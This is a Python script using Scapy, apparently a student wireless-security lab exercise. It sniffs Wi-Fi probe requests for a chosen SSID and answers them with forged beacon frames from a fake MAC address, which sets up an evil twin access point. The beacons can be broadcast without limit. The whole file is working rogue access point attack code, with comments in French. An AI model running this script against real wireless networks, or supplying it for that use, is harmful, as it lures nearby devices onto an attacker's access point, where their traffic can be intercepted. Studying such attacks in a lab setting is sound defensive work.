# source :  https://www.thepythoncode.com/article/create-fake-access-points-scapy
#           https://github.com/adamziaja/python/blob/master/probe_request_sniffer.py
#
# Auteurs : Benoit Julien et Sutcu Volkan
# But: Trouver une probe Request pour le SSID passé en paramètre et faire une evil twin attack (dans notre cas, il s'agit de créer un faux point d'accès avec le même SSID)
# Date : 16.03.2020

from scapy.all import *
import argparse
from faker import Faker

# Permait d'ajouter des arguments au scripts
parser = argparse.ArgumentParser(prog="script1_evilTwin.py", description="Ce script detecter une STA cherchant un SSID donné en paramètre et propose un evil twin si le SSID est trouvé ")
conf.verb = 0
parser.add_argument("-n", "--Number", required=True, help="Nombre de paquet à envoyer (-1 pour boucle infinie)")
parser.add_argument("-i", "--Interface", required=True, help="Interface qui doit être utilisée")
parser.add_argument("-s", "--SSID", required=True, help="SSID qu'il faut rechercher")
tab_args = parser.parse_args()
# Variable permettant de compter le nombre de SSID trouvé
i = 0

# Fonction permettant de trouvé le SSID passé en paramètre parmis les probe request
def Handler(pkt):
    global i
    if pkt.haslayer(Dot11Elt):
        # Vérifie que ce soit une probe Request
        if pkt.type == 0 and pkt.subtype == 4:
            if pkt.info.decode() == tab_args.SSID:
                print("\nSSID trouvé")
                i = i + 1
                evilTwin()

# Fonction permettant de créer un faux access point
def evilTwin():
    # On crée une fausse adresse mac
    fakeMac = Faker().mac_address()
    # On forge un paquet avec la fausse adresse mac et le nom SSID donné en paramètre
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fakeMac, addr3=fakeMac)
    essid = Dot11Elt(ID="SSID", info=tab_args.SSID, len=len(tab_args.SSID))
    frame = RadioTap()/dot11/Dot11Beacon()/essid

    # Si le nombre est égal à -1, alors on fait un boucle infinie sur l'envoi du paquet
    if int(tab_args.Number) == -1:
        print("Un nombre infini de paquet va être envoyé, CTRL+C pour annuler...")
        sendp(frame, iface=tab_args.Interface, loop=1)
    # Sinon on boucle ne nombre de fois que c'est demandé
    else:
        for k in range(int(tab_args.Number)):
            sendp(frame, iface=tab_args.Interface)
        print(tab_args.Number + " paquets ont été envoyés !")

# Sniff le réseau en exectutant la fonction Handler avec un timeout de 30 sec
print("Sniffing en cours...")
sniff(iface=tab_args.Interface, prn=Handler, timeout=30)
if i == 0:
    print("Aucun SSID trouvé avec le nom : " + tab_args.SSID)
